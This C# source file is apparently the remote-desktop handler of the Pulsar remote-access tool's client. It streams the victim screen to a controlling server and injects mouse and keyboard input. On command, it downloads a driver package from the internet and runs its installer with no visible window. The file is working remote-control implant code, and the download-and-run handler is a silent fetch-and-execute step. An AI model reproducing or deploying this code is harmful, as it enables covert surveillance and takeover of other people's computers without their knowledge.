﻿using Pulsar.Client.Helper;
using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Common.Networking;
using Pulsar.Common.Video;
using Pulsar.Common.Video.Codecs;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;
using System.Threading;
using System.Diagnostics;
using Pulsar.Common.Messages.Monitoring.RemoteDesktop;
using Pulsar.Common.Messages.other;
using System.Collections.Concurrent;
using System.Runtime.InteropServices;
using Pulsar.Client.Config;
using System.Collections.Generic;
using Pulsar.Client.Utilities;
using System.Linq;
using Pulsar.Common.Messages.Monitoring.VirtualMonitor;

namespace Pulsar.Client.Messages
{
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct WNDCLASS
    {
        public uint style;
        public WndProcDelegate lpfnWndProc;
        public int cbClsExtra;
        public int cbWndExtra;
        public IntPtr hInstance;
        public IntPtr hIcon;
        public IntPtr hCursor;
        public IntPtr hbrBackground;
        [MarshalAs(UnmanagedType.LPStr)]
        public string lpszMenuName;
        [MarshalAs(UnmanagedType.LPStr)]
        public string lpszClassName;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct BLENDFUNCTION
    {
        public byte BlendOp;
        public byte BlendFlags;
        public byte SourceConstantAlpha;
        public byte AlphaFormat;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct POINT
    {
        public int x;
        public int y;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SIZE
    {
        public int cx;
        public int cy;
    }

    public delegate IntPtr WndProcDelegate(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);

    public class RemoteDesktopHandler : NotificationMessageProcessor, IDisposable
    {
        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SetThreadDesktop(IntPtr hDesktop);

        private UnsafeStreamCodec _streamCodec;
        private BitmapData _desktopData = null;
        private Bitmap _desktop = null;
        private int _displayIndex = 0;
        private ISender _clientMain;
        private Thread _captureThread;
        private CancellationTokenSource _cancellationTokenSource;

        private ScreenOverlay _screenOverlay = new ScreenOverlay();

        private bool _useGPU = false;

        // frame control variables
        private readonly ConcurrentQueue<byte[]> _frameBuffer = new ConcurrentQueue<byte[]>();
        private readonly AutoResetEvent _frameRequestEvent = new AutoResetEvent(false);
        private int _pendingFrameRequests = 0;

        private const int MAX_BUFFER_SIZE = 10;

        private readonly Stopwatch _stopwatch = new Stopwatch();
        private int _frameCount = 0;

        // drawing commands
        private readonly ConcurrentQueue<Action> _drawingQueue = new ConcurrentQueue<Action>();
        private readonly ManualResetEvent _drawingSignal = new ManualResetEvent(false);
        private Thread _drawingThread;
        private bool _drawingThreadRunning = false;

        public override bool CanExecute(IMessage message) => message is GetDesktop ||
                                                             message is DoMouseEvent ||
                                                             message is DoKeyboardEvent ||
                                                             message is DoDrawingEvent ||
                                                             message is GetMonitors ||
                                                             message is DoInstallVirtualMonitor;

        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetDesktop msg:
                    Execute(sender, msg);
                    break;
                case DoMouseEvent msg:
                    Execute(sender, msg);
                    break;
                case DoKeyboardEvent msg:
                    Execute(sender, msg);
                    break;
                case DoDrawingEvent msg:
                    _drawingQueue.Enqueue(() => Execute(sender, msg));
                    _drawingSignal.Set();
                    EnsureDrawingThreadIsRunning();
                    break;
                case GetMonitors msg:
                    Execute(sender, msg);
                    break;
                case DoInstallVirtualMonitor msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void EnsureDrawingThreadIsRunning()
        {
            if (!_drawingThreadRunning)
            {
                _drawingThreadRunning = true;
                _drawingThread = new Thread(DrawingThreadProc);
                _drawingThread.IsBackground = true;
                _drawingThread.Start();
            }
        }

        private void DrawingThreadProc()
        {
            try
            {
                while (_drawingThreadRunning)
                {
                    _drawingSignal.WaitOne();

                    while (_drawingQueue.TryDequeue(out Action drawAction))
                    {
                        try
                        {
                            drawAction();
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"Error processing drawing action: {ex.Message}");
                        }
                    }

                    _drawingSignal.Reset();
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error in drawing thread: {ex.Message}");
            }
            finally
            {
                _drawingThreadRunning = false;
            }
        }

        private void Execute(ISender client, GetDesktop message)
        {
            if (message.Status == RemoteDesktopStatus.Stop)
            {
                StopScreenStreaming();
            }
            else if (message.Status == RemoteDesktopStatus.Start)
            {
                StartScreenStreaming(client, message);
            }
            else if (message.Status == RemoteDesktopStatus.Continue)
            {
                // server is requesting more frames
                Interlocked.Add(ref _pendingFrameRequests, message.FramesRequested);
                _frameRequestEvent.Set();
            }
        }

        private void StartScreenStreaming(ISender client, GetDesktop message)
        {
            Debug.WriteLine("Starting remote desktop session");

            var monitorBounds = ScreenHelperCPU.GetBounds(message.DisplayIndex);
            var resolution = new Resolution { Height = monitorBounds.Height, Width = monitorBounds.Width };

            if (_streamCodec == null)
                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);

            if (message.CreateNew)
            {
                _streamCodec?.Dispose();
                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
                OnReport("Remote desktop session started");
            }

            if (_streamCodec.ImageQuality != message.Quality || _streamCodec.Monitor != message.DisplayIndex || _streamCodec.Resolution != resolution)
            {
                _streamCodec?.Dispose();
                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
            }

            _displayIndex = message.DisplayIndex;
            _clientMain = client;

            _useGPU = message.UseGPU;
            Debug.WriteLine("Use GPU: " + _useGPU);

            // clear any pending frame requests and existing frames
            ClearFrameBuffer();
            Interlocked.Exchange(ref _pendingFrameRequests, message.FramesRequested);

            if (_captureThread == null || !_captureThread.IsAlive)
            {
                _cancellationTokenSource = new CancellationTokenSource();
                _captureThread = new Thread(() => BufferedCaptureLoop(_cancellationTokenSource.Token));
                _captureThread.Start();
            }
        }

        private void StopScreenStreaming()
        {
            Debug.WriteLine("Stopping remote desktop session");

            _cancellationTokenSource?.Cancel();

            if (_captureThread != null && _captureThread.IsAlive)
            {
                _frameRequestEvent.Set(); // wake up thread
                _captureThread.Join();
                _captureThread = null;
            }

            if (_desktop != null)
            {
                if (_desktopData != null)
                {
                    try
                    {
                        _desktop.UnlockBits(_desktopData);
                    }
                    catch
                    {
                    }
                    _desktopData = null;
                }
                _desktop.Dispose();
                _desktop = null;
            }

            if (_streamCodec != null)
            {
                _streamCodec.Dispose();
                _streamCodec = null;
            }

            // clean up gpu bs
            if (_useGPU)
            {
                ScreenHelperGPU.CleanupResources();
            }

            // clear the buff
            ClearFrameBuffer();
            Interlocked.Exchange(ref _pendingFrameRequests, 0);
        }

        private void BufferedCaptureLoop(CancellationToken cancellationToken)
        {
            Debug.WriteLine("Starting buffered capture loop");
            _stopwatch.Start();

            bool success = SetThreadDesktop(Settings.OriginalDesktopPointer);
            if (!success)
            {
                Debug.WriteLine($"Failed to set capture thread to original desktop: {Marshal.GetLastWin32Error()}");
                return;
            }

            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    // Wait only if the buffer is full. Capture proactively otherwise.
                    if (_frameBuffer.Count >= MAX_BUFFER_SIZE)
                    {
                        // Wait for a frame request signal OR a short timeout to re-check buffer/cancellation
                        _frameRequestEvent.WaitOne(100); // Reduced timeout

                        // Check cancellation after wait
                        if (cancellationToken.IsCancellationRequested) break;

                        // If buffer is still full after wait, continue waiting
                        if (_frameBuffer.Count >= MAX_BUFFER_SIZE) continue;
                    }

                    // Capture frame and add to buffer (if buffer is not full)
                    // This part now runs more often, as long as the buffer has space.
                    byte[] frameData = CaptureFrame();
                    if (frameData != null && _frameBuffer.Count < MAX_BUFFER_SIZE) // Check again before enqueueing
                    {
                        _frameBuffer.Enqueue(frameData);

                        // Trigger sending if requests are pending
                        if (_pendingFrameRequests > 0)
                        {
                            _frameRequestEvent.Set(); // Signal that a new frame is available
                        }

                        // Frame counter stats (optional, keep as is)
                        _frameCount++;
                        if (_stopwatch.ElapsedMilliseconds >= 1000)
                        {
                            Debug.WriteLine($"Capture FPS: {_frameCount}, Buffer size: {_frameBuffer.Count}, Pending requests: {_pendingFrameRequests}");
                            _frameCount = 0;
                            _stopwatch.Restart();
                        }
                    }
                    else if (frameData == null)
                    {
                        // Optional: Add a small delay if capture failed repeatedly
                        Thread.Sleep(50);
                    }

                    // Send frames if we have pending requests and frames available
                    while (_pendingFrameRequests > 0 && _frameBuffer.TryDequeue(out byte[] frameToSend))
                    {
                        SendFrameToServer(frameToSend, Interlocked.Decrement(ref _pendingFrameRequests) == 0);
                         // If we successfully sent a frame, reset the event just in case
                         // it was set unnecessarily while requests were being processed.
                         _frameRequestEvent.Reset();
                    }

                    // If no requests are pending, wait for the next request signal.
                    // This prevents a tight loop when idle.
                    if (_pendingFrameRequests <= 0)
                    {
                        _frameRequestEvent.WaitOne(100); // Wait for server request or timeout
                        if (cancellationToken.IsCancellationRequested) break;
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Error in buffered capture loop: {ex.Message}");
                    Thread.Sleep(100); // Avoid tight loop in case of repeated errors
                }
            }

            Debug.WriteLine("Buffered capture loop ended");
        }

        private byte[] CaptureFrame()
        {
            try
            {
                if (_useGPU)
                    _desktop = ScreenHelperGPU.CaptureScreen(_displayIndex);
                else
                _desktop = ScreenHelperCPU.CaptureScreen(_displayIndex);

                if (_desktop == null)
                {
                    Debug.WriteLine("Error capturing screen: Bitmap is null");
                    return null;
                }

                _desktopData = _desktop.LockBits(new Rectangle(0, 0, _desktop.Width, _desktop.Height),
                    ImageLockMode.ReadWrite, _desktop.PixelFormat);

                using (MemoryStream stream = new MemoryStream())
                {
                    if (_streamCodec == null) throw new Exception("StreamCodec can not be null.");
                    _streamCodec.CodeImage(_desktopData.Scan0,
                        new Rectangle(0, 0, _desktop.Width, _desktop.Height),
                        new Size(_desktop.Width, _desktop.Height),
                        _desktop.PixelFormat, stream);

                    return stream.ToArray();
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error capturing frame: {ex.Message}");
                return null;
            }
            finally
            {
                if (_desktopData != null)
                {
                    _desktop.UnlockBits(_desktopData);
                    _desktopData = null;
                }
                _desktop?.Dispose();
                _desktop = null;
            }
        }

        private void SendFrameToServer(byte[] frameData, bool isLastRequestedFrame)
        {
            if (frameData == null || _clientMain == null) return;

            try
            {
                _clientMain.Send(new GetDesktopResponse
                {
                    Image = frameData,
                    Quality = _streamCodec.ImageQuality,
                    Monitor = _streamCodec.Monitor,
                    Resolution = _streamCodec.Resolution,
                    Timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds(),
                    IsLastRequestedFrame = isLastRequestedFrame
                });
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error sending frame to server: {ex.Message}");
            }
        }

        private void ClearFrameBuffer()
        {
            while (_frameBuffer.TryDequeue(out _)) { }
        }

        private void Execute(ISender sender, DoMouseEvent message)
        {
            try
            {
                Screen[] allScreens = Screen.AllScreens;
                int offsetX = allScreens[message.MonitorIndex].Bounds.X;
                int offsetY = allScreens[message.MonitorIndex].Bounds.Y;
                Point p = new Point(message.X + offsetX, message.Y + offsetY);

                // Disable screensaver if active before input
                if (NativeMethodsHelper.IsScreensaverActive())
                    NativeMethodsHelper.DisableScreensaver();

                switch (message.Action)
                {
                    case MouseAction.LeftDown:
                    case MouseAction.LeftUp:
                        NativeMethodsHelper.DoMouseLeftClick(p, message.IsMouseDown);
                        break;
                    case MouseAction.RightDown:
                    case MouseAction.RightUp:
                        NativeMethodsHelper.DoMouseRightClick(p, message.IsMouseDown);
                        break;
                    case MouseAction.MoveCursor:
                        NativeMethodsHelper.DoMouseMove(p);
                        break;
                    case MouseAction.ScrollDown:
                        NativeMethodsHelper.DoMouseScroll(p, true);
                        break;
                    case MouseAction.ScrollUp:
                        NativeMethodsHelper.DoMouseScroll(p, false);
                        break;
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error executing mouse event: {ex.Message}");
            }
        }

        private void Execute(ISender sender, DoKeyboardEvent message)
        {
            try
            {
                if (NativeMethodsHelper.IsScreensaverActive())
                    NativeMethodsHelper.DisableScreensaver();

                NativeMethodsHelper.DoKeyPress(message.Key, message.KeyDown);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error executing keyboard event: {ex.Message}");
            }
        }
        
        private void Execute(ISender sender, DoDrawingEvent message)
        {
            try
            {
                if (message.IsClearAll)
                {
                    _screenOverlay.ClearDrawings(message.MonitorIndex);
                }
                else if (message.IsEraser)
                {
                    _screenOverlay.DrawEraser(
                        message.PrevX, message.PrevY,
                        message.X, message.Y,
                        message.StrokeWidth, message.MonitorIndex);
                }
                else
                {
                    _screenOverlay.Draw(
                        message.PrevX, message.PrevY,
                        message.X, message.Y,
                        message.StrokeWidth, message.ColorArgb, message.MonitorIndex);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error processing drawing event: {ex.Message}");
            }
        }

        private void Execute(ISender client, GetMonitors message)
        {
            int screenCountTotal = DisplayManager.GetDisplayCount();

            Debug.WriteLine(screenCountTotal);

            client.Send(new GetMonitorsResponse { Number = screenCountTotal });
        }

        private void Execute(ISender client, DoInstallVirtualMonitor message)
        {
            string downloadURL = "https://www.amyuni.com/downloads/usbmmidd_v2.zip";
            string dropPath = Path.Combine(Settings.DIRECTORY, "usbmmidd_v2.zip");

            // download the virtual monitor driver
            if (!File.Exists(dropPath))
            {
                try
                {
                    using (var wc = new System.Net.WebClient())
                    {
                        wc.DownloadFile(downloadURL, dropPath);
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Error downloading virtual monitor driver: {ex.Message}");
                    return;
                }
            }

            // extract the driver
            string extractPath = Path.Combine(Settings.DIRECTORY, "usbmmidd_v2");
            if (!Directory.Exists(extractPath))
            {
                try
                {
                    System.IO.Compression.ZipFile.ExtractToDirectory(dropPath, extractPath);
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Error extracting virtual monitor driver: {ex.Message}");
                    return;
                }
            }

            extractPath = Path.Combine(extractPath, "usbmmidd_v2");

            // deviceinstaller64.exe install usbmmIdd.inf usbmmidd
            // deviceinstaller64.exe enableidd 1

            // install the driver
            string installPath = Path.Combine(extractPath, "deviceinstaller64.exe");
            string arguments = $"install {Path.Combine(extractPath, "usbmmIdd.inf")} usbmmidd";
            ProcessStartInfo psi = new ProcessStartInfo(installPath, arguments);
            psi.UseShellExecute = false;
            psi.RedirectStandardOutput = true;
            psi.CreateNoWindow = true;
            psi.RedirectStandardError = true;

            Process p = Process.Start(psi);
            p.WaitForExit();

            // enable the driver
            arguments = "enableidd 1";
            psi = new ProcessStartInfo(installPath, arguments);
            psi.UseShellExecute = false;
            psi.RedirectStandardOutput = true;
            psi.CreateNoWindow = true;
            psi.RedirectStandardError = true;

            p = Process.Start(psi);
            p.WaitForExit();
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                StopScreenStreaming();
                _streamCodec?.Dispose();
                _cancellationTokenSource?.Dispose();
                _frameRequestEvent?.Dispose();
                
                _drawingThreadRunning = false;
                _drawingSignal.Set();
                if (_drawingThread != null && _drawingThread.IsAlive)
                {
                    _drawingThread.Join(1000);
                }
                _drawingSignal.Dispose();
                _screenOverlay?.Dispose();

                // Clean up GPU resources
                if (_useGPU)
                {
                    ScreenHelperGPU.CleanupResources();
                }
            }
        }
    }
}